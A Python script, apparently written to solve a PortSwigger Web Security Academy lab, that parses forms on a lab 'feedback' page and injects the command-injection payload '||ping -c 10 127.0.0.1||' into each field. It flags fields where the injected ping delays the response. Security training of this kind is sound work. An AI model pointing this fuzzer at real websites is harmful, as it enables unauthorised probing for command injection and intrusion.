import requests
import sys

from io import BytesIO
from lxml import etree
from urllib.parse import urljoin

TARGET = 'https://0aee00ae04dec6b0806c711a00260040.web-security-academy.net/feedback'
GET_FORM = True
DATA = {}
TIMEOUT = 15
PAYLOAD = '||ping -c 10 127.0.0.1||'

def fuzz(target: str, get_form: bool, payload, data={}, timeout=10) -> None:
    session = requests.Session()

    if get_form:
        try:
            response = session.get(target, timeout=timeout)
        except requests.RequestException as e:
            print(f'An error occurred: {e}')
            sys.exit(0)
        
        forms = get_form_data(response.content)
        
        for form in forms:
            for control in form['controls']:
                data[control['name']] = control['value']
            
            inject_inputs(urljoin(target, form['action']), timeout, data, form['method'], payload, session)
    else:
        inject_inputs(target, timeout, data, 'GET', payload, session)

def inject_inputs(target: str, timeout: int, data: dict, method: str, payload: str, session: requests.Session) -> None:

    for param in data:
        original_data = data[param]
        data[param] += payload

        try:
            if method.upper() == 'POST':
                response = session.post(target, data, timeout=timeout)
            elif method.upper() == 'GET':
                response = session.get(target, data, timeout=timeout)
            print(response.request.body)
        except requests.RequestException as e:
            print(f'An error occurred: {e}')
            data[param] = original_data
            continue

        if response.elapsed.total_seconds() >= 10:
            print(f'Potential Command Injection vulnerabilty detected in the {param} input.')
            print(response.text)
        else:
            print(f'Command injection failed for {param} parameter.')

        data[param] = original_data

def get_form_data(content: bytes) -> list:
    forms_list = []

    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser)
    forms = tree.xpath('//form')

    for form in forms:
        controls = []

        for control in form.xpath('//input | //select | //textarea'):
            name = control.get('name')

            if name is None:
                continue

            if control.tag == 'textarea':
                value = control.text or 'test'
            elif control.tag == 'select':
                options = control.xpath('./option[@selected]') or control.xpath('./option')
                option = options[0] if options else None
                value = option.get('value') or option.text or '' if option is not None else 'test'
            else:
                value = control.get('value') or 'test'

            controls.append({
                'name': name,
                'value': value,
            })

        forms_list.append({
            'method': form.get('method'),
            'action': form.get('action'),
            'controls': controls
        })

    return forms_list

if __name__ == '__main__':
    fuzz(
        TARGET,
        GET_FORM,
        PAYLOAD,
        DATA,
        TIMEOUT
    )